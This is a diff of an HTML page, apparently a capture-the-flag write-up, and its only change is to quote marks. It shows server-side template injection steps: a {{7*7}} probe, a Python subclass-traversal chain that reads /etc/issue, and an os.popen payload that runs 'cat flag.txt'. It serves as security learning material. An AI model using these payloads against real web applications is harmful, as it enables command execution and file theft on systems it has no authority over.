@@ -238,9 +238,9 @@
 </span></span></code></pre></div><p>The first step was to send a test code, in the subject field, with the objective of circumventing the esc() function, the payload {{7*7}} was used:</p>
 <p><img src="/images/kitctf-1.png" alt=""></p>
 <p><img src="/images/kitctf-2.png" alt=""></p>
-<p>The next step was to try to run commands using the command &lsquo;rodnt&rsquo;.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[92].<strong>subclasses</strong>()[0].<strong>subclasses</strong>()<a href="'/etc/issue'">0</a>.read():</p>
+<p>The next step was to try to run commands using the command 'rodnt'.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[92].<strong>subclasses</strong>()[0].<strong>subclasses</strong>()<a href="'/etc/issue'">0</a>.read():</p>
 <p><img src="/images/kitctf-3.png" alt=""></p>
-<p>The next step was to execute the payload to list the files contained in the machine, the following payload was used {{request.application.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>(&lsquo;os&rsquo;).popen(&lsquo;cat flag.txt&rsquo;).read()}}.</p>
+<p>The next step was to execute the payload to list the files contained in the machine, the following payload was used {{request.application.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('cat flag.txt').read()}}.</p>
 <p><img src="/images/kitctf-4.png" alt=""></p>
 <p><img src="/images/kitctf-5.png" alt=""></p>
 <blockquote>
